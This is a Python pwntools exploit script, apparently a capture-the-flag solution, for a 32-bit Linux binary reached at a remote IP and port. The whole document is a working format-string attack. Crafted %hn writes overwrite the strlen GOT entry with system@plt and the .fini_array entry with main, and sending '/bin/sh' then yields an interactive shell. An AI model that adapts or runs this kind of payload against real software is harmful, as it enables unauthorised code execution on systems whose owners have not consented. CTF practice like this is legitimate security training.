from pwn import *

context(os='linux', arch='i386', log_level='debug')

p = process('../file/1330703b472c4eaab999ffc141717c64')
p = remote('61.147.171.105', '59867')

input('continue?')

strlen_got = 0x08049a54
main_addr =0x080484f0
fini_array_addr = 0x08049934
system_plt = 0x08048490

# strlen_got地址改为system_plt，fini_array地址改为_start地址
# payload = b'aa' + fmtstr_payload(12, {fini_array_addr:main_addr, strlen_got:system_plt}, numbwritten=20, overflows=44, write_size='short')
payload = flat(
    b'aa',
    strlen_got + 2,
    fini_array_addr + 2,
    strlen_got,
    fini_array_addr,
    b'%2016c%12$hn',
    b'%13$hn'
    b'%31884c%14$hn',
    b'%96c%15$hn'
)

p.sendlineafter(b'name... ', payload)
p.sendlineafter(b'name... ', b'/bin/sh')

p.interactive()